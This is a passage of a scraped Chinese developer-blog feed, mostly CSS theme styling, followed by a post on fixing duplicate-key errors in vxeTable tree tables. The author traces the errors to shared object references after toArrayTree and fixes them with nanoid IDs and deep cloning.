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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"「"}.markdown-body strong:after{content:"」"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"❝";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"❞";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">一、背景</h2>
<p>在使用vxeTable中，遇到了一直提示key重复问题，通过一系列排查，找到了问题所在，特此记录。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d7de0beee464f0b9b389ef9f83a5232~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgelJlYWRvbmx5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510506&amp;x-signature=2IHokQ3EWeS6x7hOW2NEj9mjaRY%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">二、遇到的问题</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d35d6e9e3f6d434fbd704da21fc0fdd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgelJlYWRvbmx5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510506&amp;x-signature=08OZhHuhvuzOXfoBQME%2BRiTWitM%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-js" lang="js">&lt;<span class="hljs-title class_">StyleProvider</span> hash-priority=<span class="hljs-string">"high"</span> :transformers=<span class="hljs-string">"[legacyLogicalPropertiesTransformer]"</span>&gt;
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AppProvider</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">RouterView</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bg-layout"</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">AppProvider</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">StyleProvider</span>&gt;
</code></pre>
<h4 data-id="heading-2">之前使用vxetable由于后端传来的数组对象是平级，翻阅文档发现transform设置可以直接在内部转化，可以不用自己处理数据。后面发现我定义的rowConfig.keyField使用的是gzdcode字段(后端说是主键)，导致id重复表格显示异常。便进行了一层处理，改用lid+gzdcode。</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5555baf650504076bb90259933397d3d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgelJlYWRvbmx5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510506&amp;x-signature=zC7t%2BlOzUHChzr6h2hm9jSzmdoc%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-3">此次解决过后，验证出问题的数据之后，匆忙上了生产，后续我无意操作此处的树状结构发现还存在问题，于是我便重新思考解决。</h4>
<h3 data-id="heading-4">找出问题所在</h3>
<h4 data-id="heading-5">首先我将原始数据进行打印，并且在控制台进行搜索重复的uniqueId值，结果我发现，出现error的几个值并没有发现重复，我就觉得纳闷，就去GitHub上希望可以寻找答案。转了一圈发现issue并没有人提出类似的问题。后面想到了使用xe-utils自带的toArrayTree转换成树状，并且去除组件的transform发现有同样的问题。</h4>
<h4 data-id="heading-6">后面将转换后的数据在控制台进行搜索重复的uniqueId值，同样没有重复数据，那到底哪里重复了？后面想到复制到json文档中进行搜索，还真让我发现了重复的两条数据。</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86ecf4959b25445193ae085fc321140e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgelJlYWRvbmx5:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765510506&amp;x-signature=Sa%2F%2FfqN24h%2BAMIkmY7QhRwbMNUs%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">同样的一条数据，因为他们的父级id相同（但是父级的uniqueId不同），导致同一条数据插入到了两条流向下面（一正一负），我当时就想拿数据找后端对峙，后面想到了之前后端的种种劣迹，还是自己想办法解决。</h4>
<h3 data-id="heading-8">解决办法</h3>
<h4 data-id="heading-9">如果是同一条数据分别插入到两个父级元素，那肯定数据自带的字段生成uuid这个方法肯定不行。而且哪怕后端跟我生成了一个主键也并没有用。vxeTable内部自带的平级转树状肯定也是没用的。</h4>
<h4 data-id="heading-10">我应该使用vxeTable自带的toArrayTree方法进行转层级结构，并且转化完之后递归给每个item生成uuid，代码如下：</h4>
<pre><code class="hljs language-js" lang="js">tableDetailList.<span class="hljs-property">value</span> = <span class="hljs-title function_">addUniqueId</span>(<span class="hljs-title function_">toArrayTree</span>(<span class="hljs-title function_">cloneDeep</span>(data), { <span class="hljs-attr">key</span>: <span class="hljs-string">'id'</span>, <span class="hljs-attr">parentKey</span>: <span class="hljs-string">'parentID'</span> }));
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addUniqueId</span>(<span class="hljs-params">data: any[]</span>) {
  <span class="hljs-keyword">if</span> (!data) <span class="hljs-keyword">return</span> [];
  <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
    item.<span class="hljs-property">uniqueId</span> = <span class="hljs-title function_">nanoid</span>();
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">children</span> &amp;&amp; item.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      item.<span class="hljs-property">children</span> = <span class="hljs-title function_">addUniqueId</span>(item.<span class="hljs-property">children</span>);
    }
    <span class="hljs-keyword">return</span> item;
  });
}
</code></pre>
<h3 data-id="heading-11">后续</h3>
<h4 data-id="heading-12">完事过后，我发现还是提示显示重复的主键提示，百思不得其解，我开始审视我的代码，并且debugger调试。终终终终终终终终于让我发现问题，toArrayTree方法应该没有将重复主键的children中的item进行深拷贝，导致之前重复数据引用地址一样，导致uniqueId赋值时候，实际上改了不同父级的同一数据，果然AI写的代码没有那么靠谱（必须有人背锅）。 所以我在addUniqueId方法中return item加一个深拷贝。</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">addUniqueId</span>(<span class="hljs-params">data: any[]</span>) {
  <span class="hljs-keyword">if</span> (!data) <span class="hljs-keyword">return</span> [];
  <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
    item.<span class="hljs-property">uniqueId</span> = <span class="hljs-title function_">nanoid</span>();
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">children</span> &amp;&amp; item.<span class="hljs-property">children</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      item.<span class="hljs-property">children</span> = <span class="hljs-title function_">addUniqueId</span>(item.<span class="hljs-property">children</span>);
    }
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">cloneDeep</span>(item);
  });
}
</code></pre>
<h4 data-id="heading-13">终于问题解决。</h4></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue学习笔记-项目结构与文件结构分析]]></title>    <link>https://juejin.cn/post/7579892134816890915</link>    <guid>https://juejin.cn/post/7579892134816890915</guid>    <pubDate>2025-12-05T03:37:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892134816890915" data-draft-id="7579892222609195043" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" 